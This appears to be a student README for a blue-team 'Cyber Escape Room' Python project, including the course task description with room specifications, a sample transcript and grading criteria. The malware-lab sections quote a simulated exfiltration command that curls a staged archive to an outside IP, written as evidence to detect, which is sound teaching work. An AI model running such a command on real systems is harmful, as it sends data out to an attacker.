# ESCAPE ROOM PROJECT - PROGRAMMING FUNDAMENTALS
Group: Group 09

# MEMBERS
- Derek Mauricio Aguilar Ruiz
- Era Margjini

# HOW TO PLAY

From the project directory, start the interactive game with:

python escape.py --start intro --data data --transcript run.txt

The game starts in the lobby and displays a `>` prompt. Enter one command at a
time, then press Enter. 

Visit each room and inspect the room's interactable to solve its puzzle and collect its evidence.

Use `look` to see the current room, `inventory` to review collected items, and
`hint` to get a room-specific clue. 
`save <name>` saves to `<name>.txt`; `load <name>` loads that save. 
Names that already include a file extension are rejected. 

# LIST OF AVAILABLE COMMANDS
 -`help`
    Lists all available commands.
 -`look`
    Gives room description.
 -`move`
    Moves from room to room.
 -`inspect`
    Interacts/Inspects an available item in the room.
 -`hint`
    Gives a hint as to what is interactable in the room.
 -`inventory`
    Look at all tokens collected so far.
 -`save`
    Create a new save file (save file name should be input after save command).
    Example: save savefile
 -`load`
    Load an existing save file (save file name should be input after load command).
    Example: load savefile
 -`quit`
    Closes the game.


Task Description:

Cyber Escape Room: Shared Task
1. Overview
An escape room (also called escape game, puzzle room, exit game, or riddle room) is a collaborative experience where a team of players must discover clues, solve puzzles, and complete tasks across one or more rooms to achieve a defined objective within a limited time frame, often “escaping” from the room. This format supports teamwork, lateral thinking, and layered puzzle design.

You assume the role of a blue-team defender responding to a simulated incident in a facility, and the task to collect and create a report of clues from the incident(s). The Cyber Escape Room you will build and run is a single Python CLI application that runs a sequence of commands to solve puzzles and collect clues from the rooms. Each room corresponds to a module or concept from the course and simulates a realistic slice of defensive work.

Why this Escape Room?
In real security operations (blue team), defenders face many different tasks:

Triage logs to spot brute-force or scanning activity
Check configurations for weak or suspicious entries
Search large dumps for hidden indicators
Trace processes to find how malware moves through a system and reconstruct process trees to detect lateral movement
Verify findings and report in a consistent way and sign the report
This escape room compresses that spectrum into five simplified "rooms"
Each room stands for one type of defender task, that cover the spectrum of blue-team work:

Room	Represents	Real-world parallel
SOC Triage Desk	Log parsing & anomaly detection	Analysts review auth logs for brute force attacks
DNS Closet	Config analysis & decoding	Incident responders decode obfuscated hints in configs
Vault Corridor	Regex search & validation	Forensics sift through dumps for valid artifacts
Malware Lab	Graph traversal	Threat hunters trace malware process trees
Final Gate	Verification & reporting	Teams must package findings into proofs
You are part of a blue-team unit responding to a simulated security incident. Your group will build one Python command-line application that moves through a set of rooms, analyzes the evidence in your assigned data pack, and collects four tokens.

Each group receives a different seeded pack. The task and file formats are the same for everyone, but the evidence, tokens, process graph, token order, and final HMAC differ by group.

Session	Python topics	Project step	Token
1	Syntax, control flow, CLI, Git, venv	Game engine and lobby	None
2	Data structures, file I/O, error handling	SOC Triage Desk	KEYPAD
3	Functions, classes, modularization	DNS Closet	DNS
4	Algorithms, regex, complexity	Vault Corridor	SAFE
5	Recursion, DFS/BFS, graph traversal	Malware Lab	PID
6	Testing, linting, code quality, HMAC	Final Gate and integration	ESCAPE
7	Demo	Full run and technical defence	—
Learning outcomes
By the end of the project, you should be able to:

decompose a larger problem into Python modules, classes, and functions;
use core Python data structures, control flow, file I/O, and exception handling;
parse and validate semi-structured security data;
reverse a documented transformation pipeline using ROT13 and Base64;
implement and explain regex search and graph traversal with DFS/BFS;
make traversal terminate safely when a graph contains a cycle;
compute HMAC-SHA256 over an evidence-derived message;
explain and defend your implementation during a live demo.
2. What you build
Build a CLI application named escape.py. It reads your data pack and exposes an interactive REPL.

Typical commands are:

look
move <room>
inspect <item>
inventory
hint
save <file>
load <file>
quit

Deliverables
Submit:

the complete Python project;
the run.txt transcript produced by your program;
tests for the main parsing and analysis functions;
a short README explaining how to run the project.
Constraints
Use the Python standard library only.
Do not hardcode tokens, PIDs, IP addresses, hint numbers, token order, or final answers.
Handle malformed input explicitly.
Your program must work with the data pack assigned to your group.
Input-file convention
All generated data files use UTF-8 and Line Feed (\n) line endings.

3. Data pack
Each group receives:

auth.log: SSH authentication records plus deliberately malformed records;
dns.cfg: key=value configuration containing encoded hints;
vault_dump.txt: noisy SAFE{a-b-c} candidates;
proc_tree.jsonl: process relationship observations in JSON-lines format, plus one malformed JSON line;
final_gate.txt: your group ID, token order, and group-specific HMAC key.
The pack is generated from a group-specific seed. Another group can therefore have different IP addresses, counts, hints, PIDs, graph structure, SAFE code, token order, and final HMAC.

4. Room specifications
Intro Lobby
Run:

python escape.py --start intro --data data --transcript run.txt
The lobby provides access to the four analysis rooms and the Final Gate. No token is produced in the lobby.

Purpose: Ensure the CLI and engine are present

Must-have behavior:

Running python escape.py --start intro --transcript run.txt starts an interactive REPL (Read–Eval–Print Loop)
Commands supported: look, move <room>, inspect <item>, use <item>, inventory, hint, save, load, quit.
Example REPL:

$ python escape.py --start intro --transcript run.txt
[Game] Cyber Escape Room started. Type 'help' for commands.

> look
You are in the Intro Lobby.
A terminal blinks in the corner. Doors lead to: soc, dns, vault, malware, final.

> move soc
You enter the SOC Triage Desk.
A cluttered screen shows failed SSH login attempts.
Items here: auth.log

> inspect auth.log
[Room SOC] Parsing logs...
17 failed attempts found in 203.0.113.0/24
Top IP is 203.0.113.42 (last octet=42)
Token formed: 4217

TOKEN[KEYPAD]=4217
EVIDENCE[KEYPAD].TOP24=203.0.113.0/24
EVIDENCE[KEYPAD].COUNT=17
EVIDENCE[KEYPAD].SAMPLE=2025-08-09T12:02:11Z lab1 sshd[2331]: Failed password for root from 203.0.113.42 port 50432 protocol 2
EVIDENCE[KEYPAD].MALFORMED_SKIPPED=3

> inventory
You currently hold: KEYPAD

> move dns
You enter the DNS Closet.
The walls are covered with scribbled key=value pairs.
Items here: dns.cfg

> inspect dns.cfg
[Room DNS] Decoding hints...
Decoded line: "The code is not in the roots but near the closet."
Token formed: closet

TOKEN[DNS]=closet
EVIDENCE[DNS].KEY=hint2
EVIDENCE[DNS].DECODED_LINE=The code is not in the roots but near the closet.

> move vault
You enter the Vault Corridor.
A noisy dump scrolls past. Somewhere a SAFE{a-b-c} hides.
Items here: vault_dump.txt

> inspect vault_dump.txt
[Room Vault] Scanning dump...
Found candidate: SAFE{ 6 - 20 - 26 }
Checksum: 6+20=26 (OK)
TOKEN[SAFE]=6-20-26
EVIDENCE[SAFE].MATCH="SAFE{ 6 - 20 - 26 }"
EVIDENCE[SAFE].CHECK=6+20=26

> move malware
You enter the Malware Lab.
A process graph flickers; exfil hides behind an innocent chain.
Items here: proc_tree.jsonl

> inspect proc_tree.jsonl
[Room Malware] Building graph...
Exfil path found: 128->131->132->136
Terminal command: sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'
TOKEN[PID]=136
EVIDENCE[PID].PATH=[128->131->132->136]
EVIDENCE[PID].CMD="sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'"

> move final
You stand before the Final Gate. The console asks for proof.

> use gate
Collected tokens: DNS=closet, SAFE=6-20-26, PID=136, KEYPAD=4217
FINAL_GATE=PENDING
MSG=group_id|closet-136-4217-6-20-26
EXPECTED_HMAC=9a8a23e09d354a95c8c51362c3b917e99e7a4d6ea0bcbf8c8974a5512fc52989

> save save1.json
[Game] Progress saved.

> quit
[Game] Goodbye. Transcript written to run.txt 
No token produced here.

SOC Triage Desk — auth.log
The SSH log contains successful and failed authentication records. Identify the /24 subnet responsible for the largest number of failed authentication attempts.

A record is valid only if it has all fields in this form:

<TIMESTAMP> <HOST> sshd[<PID>]: <Failed|Accepted> password for <USER> from <IPv4> port <PORT> protocol 2
Requirements:

TIMESTAMP must be a valid ISO-8601 timestamp;
PID and PORT must be integers;
the source must be a valid IPv4 address;
every field shown above is required.
Any line that does not satisfy the complete format is malformed and must be skipped and counted. For example, a line with an invalid IPv4 address, a missing sshd[PID], or missing hostname/port/protocol fields is malformed even if part of the line looks plausible.

For each valid Failed password record:

extract the source IP;
group failures by /24;
find the /24 with the largest failure count;
inside that /24, find the most frequent source IP;
let L be its last octet and COUNT the total failures in that /24;
form KEYPAD = "{L}{COUNT}".
The generated data guarantees one winning /24 and one most-frequent IP inside it.

Required transcript lines:

TOKEN[KEYPAD]=<code>
EVIDENCE[KEYPAD].TOP24=<cidr>/24
EVIDENCE[KEYPAD].COUNT=<int>
EVIDENCE[KEYPAD].SAMPLE=<one full valid failed-login line from the winning /24>
EVIDENCE[KEYPAD].MALFORMED_SKIPPED=<int>
Skills: file I/O, dictionaries/counters, validation, exception handling.

DNS Closet — dns.cfg
This room models a common defensive task: recognizing and reversing simple, documented obfuscation layers. Base64 is an encoding, and ROT13 is a reversible substitution; neither should be treated as encryption.

dns.cfg contains comments and key=value records. Encoded values use this form:

<encoding>:<payload>
The supported encodings are:

b64
rot13+b64
token_tag is itself encoded. Decode it first to learn which hintX is authoritative.

Example:

token_tag=b64:Mw==
hint3=rot13+b64:<payload>
token_tag=b64:Mw== decodes to the string 3, so the relevant record is hint3.

For rot13+b64, the generation pipeline is:

plaintext -> UTF-8 -> Base64 text -> ROT13
Therefore the decoding pipeline is the reverse:

ROT13 -> Base64 decode -> UTF-8 decode
Tasks:

ignore comment lines beginning with #;
parse key=value, allowing surrounding spaces around keys and values;
split an encoded value at the first : into its encoding and payload;
decode token_tag and identify the selected hint;
reverse the selected hint's declared transformation pipeline;
require the resulting bytes to decode as valid UTF-8;
remove the final period and use the final word as the DNS token.
Decoy hints are intentionally valid and may decode to plausible text. A successful decode alone does not make a hint authoritative; token_tag determines the correct hint.

Every encoded value occupies one physical line. There are no broken, truncated, or multiline Base64 values.

Required transcript lines:

TOKEN[DNS]=<word>
EVIDENCE[DNS].KEY=hintX
EVIDENCE[DNS].ENCODING=<b64|rot13+b64>
EVIDENCE[DNS].DECODED_LINE=<decoded sentence>
Skills: configuration parsing, Base64, ROT13, transformation order, UTF-8 validation, functions.

Vault Corridor — vault_dump.txt
The file contains many candidates resembling:

SAFE{a-b-c}
Spacing can vary, but each candidate is contained on one physical line.

Tasks:

use a compiled regex to extract integer values a, b, and c;
tolerate optional whitespace around braces, numbers, and hyphens;
validate each candidate using a + b == c;
identify the single candidate satisfying the checksum.
The generator guarantees exactly one valid candidate.

Required transcript lines:

TOKEN[SAFE]=a-b-c
EVIDENCE[SAFE].MATCH="<actual matched text>"
EVIDENCE[SAFE].CHECK=a+b=c
EVIDENCE[SAFE].MATCH must preserve the spacing of the text that your regex matched.

Skills: regular expressions, validation, text processing.

Malware Lab — proc_tree.jsonl
The file contains process relationship observations. A valid line is a JSON object with exactly these fields:

{"pid":412,"ppid":231,"cmd":"/usr/bin/python3 worker.py"}
The relation represented by the record is ppid -> pid. The unique process with ppid == 0 is the root.

The file also contains one malformed JSON line. Skip it and count it rather than crashing.

Some packs contain an inconsistent relationship on a decoy branch that creates a cycle. In that case, a PID can appear in more than one relationship record, but its cmd value is the same in every valid occurrence. Build graph edges from all valid relationship records and use a visited set so DFS/BFS always terminates.

The graph deliberately contains commands mentioning curl or scp that are not exfiltration. Do not classify a command only because one of those words appears.

For this task, a command qualifies as exfiltration only if it satisfies one of these contracts:

curl: invokes curl, contains -X POST, and uploads the staged archive using -d @/tmp/x.tgz;
scp: invokes scp and transfers /tmp/x.tgz to a remote destination in user@host:path form.
Examples such as curl --help, grep scp ..., echo curl ..., or a local health-check request are decoys.

Tasks:

parse each JSON line and skip/count malformed JSON;
build children[ppid] -> list[pid] from all valid relationship observations;
keep a consistent command lookup for each PID;
implement recursive DFS and iterative BFS;
use a visited set;
start from the unique root and find the path to the single reachable process satisfying the exfiltration contract;
use that terminal PID as the PID token.
Required transcript lines:

TOKEN[PID]=<pid>
EVIDENCE[PID].PATH=[p0->p1->...->pid]
EVIDENCE[PID].CMD="<matched command>"
EVIDENCE[PID].MALFORMED_SKIPPED=<int>
Skills: JSON parsing, adjacency lists, recursion, BFS/DFS, cycle handling, semantic validation, complexity.

Final Gate — final_gate.txt
The file contains:

group_id=<your-group>
token_order=<four token names>
hmac_key=<group-specific key>
It does not contain the expected HMAC.

Read token_order and concatenate the four evidence-derived token values in exactly that order:

group_id|token1-token2-token3-token4
This exact string is MSG. Compute HMAC-SHA256 using the UTF-8 encoded hmac_key as the key and UTF-8 encoded MSG as the message, then output the lowercase hexadecimal digest. During verification, your MSG and HMAC are checked against that ground truth.

Required transcript lines:

FINAL_GATE=PENDING
MSG=<group_id|token1-token2-token3-token4>
HMAC=<64-character lowercase hexadecimal digest>
Do not hardcode the message or digest.

5. Suggested project structure

from dataclasses import dataclass, field

@dataclass
class GameState:
    current_room: str = "intro"
    inventory: set[str] = field(default_factory=set)
    tokens: dict[str, str] = field(default_factory=dict)

class Room:
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description

    def solve(self, state: GameState):
        raise NotImplementedError
6. Transcript schema
run.txt must contain exactly one final value for each required tag:

TOKEN[KEYPAD]=...
EVIDENCE[KEYPAD].TOP24=...
EVIDENCE[KEYPAD].COUNT=...
EVIDENCE[KEYPAD].SAMPLE=...
EVIDENCE[KEYPAD].MALFORMED_SKIPPED=...
TOKEN[DNS]=...
EVIDENCE[DNS].KEY=hintX
EVIDENCE[DNS].ENCODING=...
EVIDENCE[DNS].DECODED_LINE=...
TOKEN[SAFE]=a-b-c
EVIDENCE[SAFE].MATCH="..."
EVIDENCE[SAFE].CHECK=a+b=c
TOKEN[PID]=...
EVIDENCE[PID].PATH=[p0->p1->...->pid]
EVIDENCE[PID].CMD="..."
EVIDENCE[PID].MALFORMED_SKIPPED=...
FINAL_GATE=PENDING
MSG=...
HMAC=...
Additional human-readable output is allowed, but do not duplicate the tagged lines.

7. Evaluation
Correctness — 40%: room outputs, evidence, final message, and HMAC are correct for your group data.
Design and decomposition — 25%: clear functions/classes, module boundaries, and reusable logic.
Demo and technical defence — 25%: live execution and ability to explain the implementation and algorithms.
Code and documentation quality — 10%: readability, error handling, tests, naming, README, and basic style/linting.
During the demo, you will be asked to explain parsing decisions, data structures, transformation order in the DNS room, regex choices, DFS/BFS behavior, why visited is necessary, complexity, the exfiltration predicate, and how the final HMAC is constructed.

ENJOY YOUR GAME AND HAPPY ESCAPING
SEE YOU AT THE FINAL GATE!
